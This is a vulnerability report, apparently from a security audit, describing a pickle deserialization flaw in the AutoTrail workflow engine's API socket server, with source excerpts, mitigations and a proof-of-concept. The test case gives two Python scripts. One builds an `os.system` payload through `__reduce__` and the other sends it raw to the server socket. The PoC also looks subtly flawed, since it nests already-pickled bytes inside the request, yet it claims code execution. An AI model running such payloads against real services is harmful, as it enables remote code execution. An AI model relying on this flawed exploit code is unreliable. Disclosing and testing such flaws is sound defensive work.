### Vulnerability List

* Vulnerability Name: Deserialization Vulnerability in API Request Handling
* Description:
    1. An attacker crafts a malicious Python object designed to execute arbitrary code upon deserialization using `pickle`.
    2. The attacker serializes this malicious object using Python's `pickle.dumps()`.
    3. The attacker creates a seemingly valid API request, such as an `APIRequest` object, but replaces its content with the serialized malicious object.
    4. The attacker uses a `SocketClient` or a similar mechanism to send this crafted API request to the AutoTrail API server's socket.
    5. The `ConnectionServer` in `api/management.py`, upon receiving the request, uses `connection.recv()` to deserialize the data, which implicitly calls `pickle.load()`.
    6. Due to the deserialization of the malicious object, arbitrary Python code provided by the attacker is executed on the server.
* Impact:
    - Remote Code Execution (RCE). Successful exploitation allows an attacker to execute arbitrary Python code on the server hosting the AutoTrail workflow engine.
    - Full System Compromise. This can lead to a complete takeover of the server, including unauthorized access to sensitive data, modification of system configurations, and disruption of workflow operations.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - None. The project utilizes `multiprocessing.Connection` for API communication, which inherently uses `pickle` for serialization without any explicit input validation or sanitization of API requests.
* Missing Mitigations:
    - Input Validation: Implement robust input validation for all API requests received by the `ConnectionServer` to ensure that only expected and safe data structures are processed.
    - Secure Serialization: Replace `pickle` with a safer serialization format like JSON or Protocol Buffers for API communication. These formats are less susceptible to deserialization vulnerabilities.
    - Secure Deserialization Practices: If `pickle` must be used, implement secure deserialization practices, such as signing and verifying serialized data to ensure integrity and origin, and sandboxing the deserialization process to limit potential damage from malicious payloads.
* Preconditions:
    - Network Accessibility: The AutoTrail API server socket must be reachable by the attacker. This is typical in networked applications or scenarios where the attacker has local access to the system running the AutoTrail instance.
    - Running API Server: The AutoTrail workflow engine with the API server component must be running and listening for connections on the designated socket.
* Source Code Analysis:
    - File: `/code/src/autotrail/core/api/management.py`
    - Class: `ConnectionServer`
    - Method: `__call__`
    ```python
    def __call__(self, *args, **kwargs):
        """This callable will serve a single request by calling the handler, sending the response and returning the
        relay value.
        ...
        """
        request = read_message(self._connection, self._timeout) # Vulnerable line
        logger.debug('Received request: {}'.format(request))
        if not request:
            return

        try:
            handler_response = self._handler(request, *args, **kwargs)
        except Exception as e:
            logger.exception(('Handler: {} failed to handle request: {}, with args={}, kwargs={} '
                              'due to error={}').format(self._handler, request, args, kwargs, e))
            return
        ...
    ```
    - File: `/code/src/autotrail/core/api/management.py`
    - Function: `read_message`
    ```python
    def read_message(connection, timeout=0.1):
        """Attempt to read a single message from the given multiprocessing.Connection object.
        ...
        """
        if connection.poll(timeout):
            try:
                return connection.recv() # Vulnerable line: connection.recv() uses pickle.load()
            except EOFError:
                pass
    ```
    - The `read_message` function is called by `ConnectionServer` to receive API requests.
    - `connection.recv()` from Python's `multiprocessing.Connection` uses `pickle` for deserialization, making it vulnerable to deserialization attacks if the incoming data is not trusted and validated.
    - The `APIRequest` class (`/code/src/autotrail/core/api/management.py`) and related API handling code do not include any input validation or sanitization mechanisms for the deserialized `request` object.

* Security Test Case:
    1. **Setup:**
        - Deploy an AutoTrail workflow instance locally or in a test environment where you can send network requests to its API socket.
        - Identify the socket file path used by the AutoTrail API server (e.g., `/tmp/validation_test.socket` as used in tests, or a user-configurable path).
    2. **Craft Malicious Payload:**
        - Create a Python script to generate a malicious pickled payload. This payload should execute a simple command on the server, like creating a file in `/tmp/`.
        ```python
        import os
        import pickle
        import multiprocessing.connection
        from autotrail.core.api.management import APIRequest

        class MaliciousPayload:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned',))

        malicious_obj = MaliciousPayload()
        serialized_payload = pickle.dumps(malicious_obj)

        # Wrap in APIRequest to mimic a real API request structure
        api_request = APIRequest(method='status', args=[], kwargs={})
        api_request.args = [serialized_payload] # Inject payload as part of args. Can be kwargs as well

        wrapped_payload = pickle.dumps(api_request)

        with open("malicious_request.pickle", "wb") as f:
            f.write(wrapped_payload)
        ```
    3. **Send Malicious Request:**
        - Create another Python script to act as the attacker client. This script will read the serialized malicious payload and send it to the AutoTrail API socket.
        ```python
        import multiprocessing.connection

        socket_file = "/tmp/validation_test.socket" # Replace with your AutoTrail socket path

        with open("malicious_request.pickle", "rb") as f:
            malicious_request_data = f.read()

        try:
            client_conn = multiprocessing.connection.Client(address=socket_file, family='AF_UNIX')
            client_conn.send_bytes(malicious_request_data) # Send bytes directly, bypassing API client wrappers
            client_conn.close()
            print("Malicious request sent.")
        except Exception as e:
            print(f"Error sending request: {e}")
        ```
    4. **Execute Test:**
        - Run the attacker client script (`python attacker_client.py`).
    5. **Verify Exploitation:**
        - Check if the file `/tmp/pwned` has been created on the server running AutoTrail. If the file exists, it confirms successful remote code execution due to the deserialization vulnerability.
        - Examine the AutoTrail server logs for any errors or unusual activity that might indicate code execution.

This test case demonstrates how an attacker can leverage the deserialization vulnerability to achieve remote code execution by sending a crafted malicious payload to the AutoTrail API server.
